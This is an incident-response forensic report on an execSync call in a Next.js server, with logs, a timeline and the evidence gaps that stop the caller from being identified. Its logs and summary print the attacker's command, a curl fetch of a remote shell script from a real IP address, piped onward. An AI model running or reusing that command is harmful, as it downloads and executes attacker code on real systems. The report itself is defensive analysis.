# Forensic Execution Chain - Reviewer Pack
**Date:** 2025-12-16  
**Mode:** Forensic / Incident Response  
**Goal:** Prove exact execution chain to execSync

---

## 1) SUMMARY (≤10 bullets, facts only)

- **execSync entrypoint:** `.next/server/chunks/9912.js` (monitoring wrapper, NOT actual source)
- **First logged occurrence:** 2025-12-15T17:41:26.787338975Z (`repeat_count=2` indicates first was suppressed)
- **Payload hash:** `3877e9a32afab409` (matches `curl http://167.86.107.35:9999/muie.sh |`)
- **Request context:** NOT FOUND (no `req_method`, `req_path`, `req_cf_ip`, `user_id`, `user_role` in logs)
- **Stack trace:** NOT FOUND (DEBUG mode disabled, first occurrence suppressed by rate limiting)
- **Timeline:** Users.update access (17:41:24) → JSON.parse error (17:41:25) → execSync (17:41:26)
- **Dataflow:** NOT FOUND (no evidence request data reaches execSync)
- **Total executions:** 8,247 in ~1 second (all after first were suppressed)

---

## 2) DIFFS

**NONE** - No code modifications made for this forensic analysis.

---

## 3) EXECUTION ENTRYPOINT

### File Path
`.next/server/chunks/9912.js`

### Code Snippet (±10 lines)
```javascript
e.execSync=function(e,t){return m("execSync",e,void 0,t),(0,i.execSync)(e,t)}
```

**Context (minified):**
```javascript
...e.exec=h,e.execSync=function(e,t){return m("execSync",e,void 0,t),(0,i.execSync)(e,t)},e.execFile=f,e.spawn=function...
```

### Type
**Framework-generated chunk** (compiled from `src/server/lib/subprocessGlobalDiag.ts`)

**Analysis:**
- This is the **monitoring wrapper**, not the actual source
- `m("execSync",e,void 0,t)` calls the logging function
- `(0,i.execSync)(e,t)` calls the original Node.js execSync
- The actual caller is **NOT in this file**

### Stack Trace
**Status:** NOT FOUND

**Reason:** First occurrence suppressed by rate limiting, DEBUG mode not enabled

**Evidence:**
- `source_file=9912.js` in logs (this is the wrapper, not the actual caller)
- No stack trace captured (production mode, first occurrence suppressed)

---

## 4) LOGS (≤200 lines, trimmed, earliest-first)

### First Logged execSync Occurrence

```
2025-12-15T17:41:26.787338975Z [SUBPROC_DIAG] event=subprocess_log_suppressed severity=INFO executed=true blocked=false logged=false category=unknown reason=log_suppressed method=execSync payload_hash=3877e9a32afab409 payload_preview="curl http://167.86.107.35:9999/muie.sh |" repeat_count=2 source_file=9912.js
```

**Fields present:**
- `event=subprocess_log_suppressed`
- `severity=INFO`
- `executed=true`
- `blocked=false`
- `logged=false`
- `category=unknown`
- `reason=log_suppressed`
- `method=execSync`
- `payload_hash=3877e9a32afab409`
- `payload_preview="curl http://167.86.107.35:9999/muie.sh |"`
- `repeat_count=2`
- `source_file=9912.js`

**Fields NOT present:**
- `req_method` - NOT FOUND
- `req_path` - NOT FOUND
- `req_cf_ip` - NOT FOUND
- `req_xff` - NOT FOUND
- `user_id` - NOT FOUND
- `user_role` - NOT FOUND
- `stack` - NOT FOUND (DEBUG mode disabled)

**Analysis:**
- `repeat_count=2` indicates this is the SECOND occurrence (first was suppressed)
- `logged=false` confirms first occurrence was rate-limited and not logged
- `source_file=9912.js` is the monitoring wrapper, not the actual caller

### Context Before Attack

```
2025-12-15T17:41:24.820994764Z [Users.update access] {
  authed: false,
  userId: undefined,
  targetId: undefined,
  role: undefined
}
2025-12-15T17:41:24.821968262Z [Users.delete access] {
  authed: false,
  userId: undefined,
  targetId: undefined,
  docId: undefined,
  role: undefined
}
2025-12-15T17:41:25.876075487Z  ⨯ SyntaxError: Unexpected token ' in JSON at position 184
2025-12-15T17:41:25.876113957Z     at JSON.parse (<anonymous>) {
2025-12-15T17:41:25.876123967Z   digest: '2892049918'
2025-12-15T17:41:26.787338975Z [SUBPROC_DIAG] ... execSync ... (first logged occurrence)
```

**Key Facts:**
- Unauthenticated Users.update/delete access checks at 17:41:24
- JSON.parse error at 17:41:25 (position 184, single quote)
- execSync starts at 17:41:26 (~1 second after JSON.parse error)
- **No HTTP request method/path in logs**

### Subsequent Executions

```
2025-12-15T17:41:26.787397395Z [SUBPROC_DIAG] event=subprocess_log_suppressed severity=INFO executed=true blocked=false logged=false category=unknown reason=log_suppressed method=execSync payload_hash=3877e9a32afab409 payload_preview="curl http://167.86.107.35:9999/muie.sh |" repeat_count=3 source_file=9912.js
2025-12-15T17:41:26.787612964Z [SUBPROC_DIAG] event=subprocess_log_suppressed severity=INFO executed=true blocked=false logged=false category=unknown reason=log_suppressed method=execSync payload_hash=3877e9a32afab409 payload_preview="curl http://167.86.107.35:9999/muie.sh |" repeat_count=4 source_file=9912.js
...
2025-12-15T17:41:27.134763987Z [SUBPROC_DIAG] event=subprocess_log_suppressed severity=INFO executed=true blocked=false logged=false category=unknown reason=log_suppressed method=execSync payload_hash=3877e9a32afab409 payload_preview="curl http://167.86.107.35:9999/muie.sh |" repeat_count=8248 source_file=9912.js
2025-12-15T17:41:27.136595501Z  ⨯ RangeError: Maximum call stack size exceeded
```

**Total executions:** 8,247 in ~1 second (all suppressed after first)

---

## 5) REQUEST-LEVEL ATTRIBUTION

### HTTP Request Identification

**Status:** NOT FOUND

**Evidence from logs:**
- No `req_method` field in execSync log entry
- No `req_path` field in execSync log entry
- No `req_cf_ip` or `req_xff` fields
- No `user_id` or `user_role` fields

### Correlation Attempt

**Users.update Access Checks (17:41:24):**
```
2025-12-15T17:41:24.820994764Z [Users.update access] {
  authed: false,
  userId: undefined,
  targetId: undefined,
  role: undefined
}
```

**Analysis:**
- Access check logged at 17:41:24 (unauthenticated)
- **BUT:** No HTTP method/path logged with access check
- **BUT:** No timestamp correlation mechanism (access check has no request ID)
- **BUT:** No evidence in logs that this access check triggered execSync

**Conclusion:** Cannot attribute execSync to a specific HTTP request from available logs.

**URL path:** NOT FOUND  
**Method:** NOT FOUND  
**Auth context:** NOT FOUND (no user_id/user_role in execSync logs)  
**Payload size:** NOT FOUND (no request body captured)

---

## 6) DATAFLOW CHECK

### Can Request Data Reach execSync?

**Status:** NO DATAFLOW FOUND

**Evidence:**
- No request context in execSync logs (no `req_method`, `req_path`, `req_cf_ip`)
- No stack trace showing data flow (first occurrence suppressed, DEBUG mode disabled)
- JSON.parse error occurred in Users collection hook (`beforeValidate`)
- Error handler in hook: `catch { delete (data as any).favorites; favs = null }`
- **No code path visible** from error handler to execSync

**Request Fields Checked:**
- `favorites` field: NOT FOUND in execSync logs
- `favoriteShows` field: NOT FOUND in execSync logs
- Request body: NOT FOUND (not captured)
- Query parameters: NOT FOUND (not captured)
- Headers: NOT FOUND (not captured)

**Conclusion:** **NO DATAFLOW FOUND** - Cannot trace any request field to execSync from available evidence.

---

## 7) QUESTIONS & RISKS (≤8 bullets, unknowns only)

1. **Q: What code calls the patched execSync?**  
   **Status:** NOT FOUND - First occurrence suppressed, no stack trace captured

2. **Q: What HTTP request triggered the attack?**  
   **Status:** NOT FOUND - No request context in logs, no correlation with Users.update access checks

3. **Q: How does JSON.parse error lead to execSync?**  
   **Status:** NOT FOUND - No code path visible, no stack trace evidence

4. **Q: Is the payload in the request body?**  
   **Status:** NOT FOUND - No request body captured in logs

5. **Q: Is this a framework-level vulnerability?**  
   **Status:** UNKNOWN - Historical evidence suggests `eval()` context, but current logs don't prove it

6. **Q: Why is there no request context in execSync logs?**  
   **Status:** UNKNOWN - Could indicate: internal call, framework-level execution, or request context not set

7. **Q: What is the digest value `2892049918`?**  
   **Status:** UNKNOWN - Appears in JSON.parse error, purpose unclear

8. **Q: Why does `source_file=9912.js` appear?**  
   **Status:** EXPLAINED - This is the monitoring wrapper file, not the actual caller (stack trace extraction limitation)

---

## CONCLUSION

**Answer to question:**
> What exact request caused what exact code path to call `execSync`?

**Answer:** **NOT FOUND**

**Evidence gaps:**
- First execSync occurrence suppressed (rate limiting)
- No stack trace captured (DEBUG mode disabled)
- No request context in logs (no `req_method`, `req_path`, `req_cf_ip`, `user_id`)
- No code path visible from JSON.parse error to execSync
- No dataflow evidence from request to execSync

**What we know (facts only):**
- execSync called at 17:41:26.787 with payload `curl http://167.86.107.35:9999/muie.sh |`
- JSON.parse error at 17:41:25.876 (position 184, single quote)
- Users.update access checks at 17:41:24 (unauthenticated)
- Entrypoint file: `.next/server/chunks/9912.js` (monitoring wrapper, not actual source)

**What we don't know:**
- Actual caller of execSync (first occurrence suppressed, no stack trace)
- HTTP request that triggered it (no request context in logs)
- Code path from JSON.parse error to execSync (no evidence)
- Whether request data reaches execSync (no dataflow evidence)

---

**END OF FORENSIC ANALYSIS**
